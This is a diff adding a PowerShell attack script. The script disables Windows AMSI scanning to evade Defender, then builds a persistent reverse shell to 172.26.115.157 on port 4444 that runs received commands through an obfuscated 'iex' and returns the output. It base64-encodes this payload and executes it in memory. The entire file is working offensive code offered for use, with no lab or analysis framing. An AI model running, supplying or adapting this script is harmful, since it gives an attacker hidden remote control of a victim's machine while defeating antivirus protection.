@@ -1,0 +1,39 @@
+# 1️⃣ Bypass AMSI to prevent Defender detection
+$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); 
+$b=$a.GetField('amsiInitFailed','NonPublic,Static'); 
+$b.SetValue($null,$true)
+
+# 2️⃣ Define the Reverse Shell Payload
+$script = @"
+`$ip = '172.26.115.157'
+`$port = 4444
+while (`$true) {
+    try {
+        `$client = New-Object System.Net.Sockets.TCPClient(`$ip, `$port)
+        `$stream = `$client.GetStream()
+        [byte[]]`$bytes = 0..65535|%{0}
+        while ((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0) {
+            `$data = (New-Object System.Text.ASCIIEncoding).GetString(`$bytes, 0, `$i)
+            `$sendback = (&('i'+'e'+'x') `$data 2>&1 | Out-String)
+            `$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> '
+            `$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2)
+            `$stream.Write(`$sendbyte, 0, `$sendbyte.Length)
+            `$stream.Flush()
+        }
+    } catch {
+        Start-Sleep 5  # Reconnect after 5 seconds if it disconnects
+    }
+}
+"@
+
+# 3️⃣ Convert to Base64 (UTF-16LE)
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
+$encoded = [Convert]::ToBase64String($bytes)
+
+# 4️⃣ Print the Base64 Payload (For Debugging)
+Write-Output "Base64 Encoded Payload:"
+Write-Output $encoded
+
+# 5️⃣ Auto-Execute the Encoded Payload in Memory
+$decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))
+iex $decoded
